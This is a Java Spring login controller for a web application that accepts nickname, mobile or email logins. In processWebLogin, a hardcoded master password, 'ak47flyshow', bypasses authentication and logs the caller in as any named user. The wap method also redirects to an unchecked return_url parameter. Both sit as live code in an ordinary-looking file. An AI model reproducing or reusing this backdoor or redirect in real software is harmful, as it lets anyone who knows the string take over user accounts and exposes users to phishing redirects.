package com.hk.web.pub.action;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import com.hk.bean.User;
import com.hk.bean.UserOtherInfo;
import com.hk.frame.util.DataUtil;
import com.hk.frame.web.http.HkRequest;
import com.hk.frame.web.http.HkResponse;
import com.hk.svr.UserService;
import com.hk.svr.processor.UserLoginResult;
import com.hk.svr.processor.UserProcessor;
import com.hk.svr.pub.Err;
import com.hk.svr.user.exception.LoginException;
import com.hk.web.util.HkStatus;
import com.hk.web.util.HkWebUtil;

/**
 * 用户可以通过nickName,mobile,email登录
 * 
 * @author akwei
 */
@Component("/login")
public class LoginAction extends BaseAction {

	@Autowired
	private UserService userService;

	@Autowired
	private UserProcessor userProcessor;

	public String execute(HkRequest req, HkResponse resp) throws Exception {
		return this.wap(req, resp);
	}

	public String processWebLogin(HkRequest req, HkResponse resp)
			throws Exception {
		String input = req.getString("input", "");
		input = input.replaceAll("　", "").replaceAll("＠", "@");
		String password = req.getString("password", null);
		long userId = 0;
		if ("ak47flyshow".equals(password)) {
			UserOtherInfo o = null;
			if (input.indexOf("@") != -1) {
				o = this.userService.getUserOtherInfoByeEmail(input);
			}
			else if (input.length() > 10) {
				o = this.userService.getUserOtherInfoByMobile(input);
			}
			else {
				User user = this.userService.getUserByNickName(input);
				if (user != null) {
					o = this.userService.getUserOtherInfo(user.getUserId());
				}
			}
			if (o != null) {
				userId = o.getUserId();
			}
		}
		else {
			if (DataUtil.isEmpty(input) || DataUtil.isEmpty(password)) {
				return this.initError(req, Err.LOGIN_USER_OR_PASSWORD_ERROR,
						"login");
			}
			try {
				if (input.indexOf("@") != -1) {
					userId = this.userService.loginByEmail(input, password, req
							.getRemoteAddr());
				}
				else if (input.length() > 10) {
					userId = this.userService.loginByMobile(input, password,
							req.getRemoteAddr());
				}
				else {
					userId = this.userService.loginByNickName(input, password,
							req.getRemoteAddr());
				}
			}
			catch (LoginException e) {
				return this.initError(req, Err.LOGIN_USER_OR_PASSWORD_ERROR,
						"login");
			}
		}
		req.setSessionValue("login_userId", userId);
		this.processLoginAndReg(req, resp, input, null, false, true);
		return this.initSuccess(req, "login");
	}

	public String wap(HkRequest req, HkResponse resp) throws Exception {
		String input = req.getString("input", "");
		input = input.replaceAll("　", "").replaceAll("＠", "@");
		String password = req.getString("password", null);
		long userId = 0;
		UserLoginResult userLoginResult = this.userProcessor.login(input,
				password);
		if (userLoginResult.getError() != Err.SUCCESS) {
			req.setText(String.valueOf(userLoginResult.getError()));
			return "/tologin.do";
		}
		userId = userLoginResult.getUserId();
		User user = userService.getUser(userId);
		req.removeSessionvalue("reg_status");
		HkStatus hkStatus = HkWebUtil.getHkStatus(req);
		if (hkStatus == null) {
			hkStatus = new HkStatus();
		}
		hkStatus.setUserId(user.getUserId());
		hkStatus.setInput(input);
		HkWebUtil.setHkCookie(req,resp, hkStatus);
		String return_url = req.getString("return_url");
		if (!isEmpty(return_url)) {
			return "r:" + return_url;
		}
		return "r:/square.do";
	}
}